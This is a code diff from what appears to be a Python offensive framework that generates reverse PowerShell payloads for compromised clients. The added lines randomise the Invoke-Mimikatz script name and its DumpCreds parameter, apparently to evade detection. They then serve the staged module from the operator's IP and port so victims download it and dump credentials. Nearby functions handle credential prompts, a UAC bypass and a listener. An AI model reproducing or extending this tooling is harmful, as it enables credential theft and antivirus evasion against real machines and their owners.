@@ -1,5 +1,4 @@
-from main import randomUnusedPort, DoServe
-from menu import returnIP
+from main import randomUnusedPort, DoServe, randomisePS1
 from generatepayload import askAndReturnModules, GeneratePayload
 from stager import clientUpload, printListener, returnServerList
 import blessed
@@ -9,6 +8,7 @@ t = blessed.Terminal()
 
 
 def reverseIpAndPort(port):
+    from menu import returnIP
     portnum = raw_input(
         '\n[*] Press Enter For Default Port(%s)\n[*] Port> ' % (t.bold_green + port + t.normal))
     if not portnum:
@@ -102,7 +102,6 @@ def reversePowerShellWatchScreenGeneration(payloadchoice, payloadname):
 
 
 def reversePowerShellAskCredsGeneration(payloadchoice, payloadname):
-    print payloadchoice
     clientnumber = int(clientUpload(payloadchoice(), isExe=False, json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     try:
         for server in returnServerList():
@@ -118,9 +117,14 @@ def reversePowerShellAskCredsGeneration(payloadchoice, payloadname):
 
 
 def reversePowerShellInvokeMimikatzGeneration(payloadchoice, payloadname):
+    from menu import returnIP
+    ip = returnIP()
     moduleport = randomUnusedPort()
-    DoServe(returnIP(), "", "./externalmodules", port=moduleport, printIt=False)
-    clientnumber = int(clientUpload(payloadchoice(), isExe=False, json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
+    powershellChanges = randomisePS1('Invoke-Mimikatz')
+    filename = powershellChanges.get('filename')
+    pDumpCreds = powershellChanges['params'].get('DumpCreds')
+    DoServe(ip, "", "./externalmodules/staged", port=moduleport, printIt=False)
+    clientnumber = int(clientUpload(payloadchoice() % (ip, moduleport, filename, filename, pDumpCreds), isExe=False, json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
     try:
         for server in returnServerList():
             while True:
@@ -135,6 +139,7 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice, payloadname):
 
 
 def UACBypassGeneration(payloadchoice, payloadname):
+    from menu import returnIP
     moduleport = randomUnusedPort()
     DoServe(returnIP(), "", "./externalmodules", port=moduleport, printIt=False)
     printListener(False, True)
